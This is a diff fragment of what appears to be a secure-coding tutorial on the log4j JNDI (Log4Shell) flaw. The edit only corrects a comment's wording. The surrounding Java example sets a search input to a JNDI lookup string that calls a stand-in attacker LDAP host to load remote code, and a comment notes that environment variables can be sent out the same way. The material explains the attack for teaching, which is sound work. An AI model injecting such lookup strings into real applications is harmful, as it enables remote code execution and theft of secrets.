@@ -135,7 +135,7 @@ The [OWASP Top 10](https://www.owasp.org/index.php/OWASP_Top_Ten_Cheat_Sheet) pr
     logger.info("User {} searched for {}", user.getId(), searchTextInput);
 
     // if attacker sets up a remote JNDI server with malicious code and passes that as the search input,
-    // it will result in the your affected application using log4j running this remote malicious code
+    // it will result in the affected application that is using log4j running this remote malicious code
     searchTextInput = "$jndi:ldap://my-evil-ldap/maliciousobject}"
 
     // attacker can also lookup application environment variables and send them over to the remote JNDI server
